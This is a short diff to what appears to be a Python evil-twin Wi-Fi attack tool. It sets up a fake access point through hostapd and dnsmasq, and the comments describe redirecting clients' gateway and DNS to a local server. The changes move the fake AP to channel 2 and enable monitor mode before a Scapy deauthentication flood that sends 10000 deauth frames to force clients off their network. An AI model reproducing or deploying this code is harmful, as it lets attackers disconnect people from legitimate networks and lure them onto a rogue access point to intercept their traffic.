@@ -77,8 +77,8 @@ def startAP(ssid, interface):
 
     # dnsmasq conf file:
     # interface=
-    # dhcp-range=10.0.0.10, 10.0.0.100, 8h (sets the IP range given to connected clients)
-    # dhcp-option=3,10.0.0.1               (sets the gateway IP address, redirect the client to localhost server
+    # dhcp-range=10.0.0.10, 10.0.0.100, 8h  (sets the IP range given to connected clients)
+    # dhcp-option=3,10.0.0.1                (sets the gateway IP address, redirect the client to localhost server
     #                                       3=default gateway
     #                                       10.0.0.1=localhost IP server)
     # dhcp-option=6, 10.0.0.1               (dns server)
@@ -91,7 +91,7 @@ def startAP(ssid, interface):
     s = open("hostapd.conf", "a")
 
     # Hostapd created fake AP with specific name
-    hostapd_conf = "interface=" + interface + "\nssid=" + ssid + "\nchannel=1\ndriver=nl80211"
+    hostapd_conf = "interface=" + interface + "\nssid=" + ssid + "\nchannel=2\ndriver=nl80211"
 
     f.write(dnsmasq_conf)
     s.write(hostapd_conf)
@@ -111,7 +111,7 @@ def stopAttack():
 def deauth(brdmac, addr, interface):
     # print("\nChoose interface for deauth attack")
     # interface = chooseDevice()
-    # goMonitorMode(interface)
+    goMonitorMode(interface)
     print("Sending deauth packets")
     pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = addr, addr3 = addr) / Dot11Deauth()
     sendp(pkt, iface=interface, count=10000, inter=.2)
